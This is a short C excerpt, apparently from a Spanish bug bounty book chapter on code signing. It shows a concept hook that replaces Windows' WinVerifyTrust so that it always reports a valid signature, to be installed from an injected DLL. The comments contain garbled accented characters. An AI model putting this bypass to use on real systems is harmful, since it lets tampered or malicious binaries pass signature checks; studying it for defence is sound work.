// Extraído de: LibroBugBounty/cap-07-firma-codigo.md
// Concepto de hook de WinVerifyTrust (simplificado)
// La DLL inyectada reemplaza la funciÃ³n original

// Guardar puntero a la funciÃ³n original
typedef LONG (WINAPI *WinVerifyTrust_t)(HWND, GUID*, LPVOID);
WinVerifyTrust_t Original_WinVerifyTrust = NULL;

// FunciÃ³n hook que siempre devuelve "firma vÃ¡lida"
LONG WINAPI Hooked_WinVerifyTrust(HWND hwnd, GUID *pgActionID,
                                   LPVOID pWVTData) {
    // Ignorar la verificaciÃ³n real, devolver Ã©xito
    return ERROR_SUCCESS;  // 0 = firma vÃ¡lida
}

// El hook se instala en DllMain de la DLL inyectada
// usando IAT patching o inline hooking
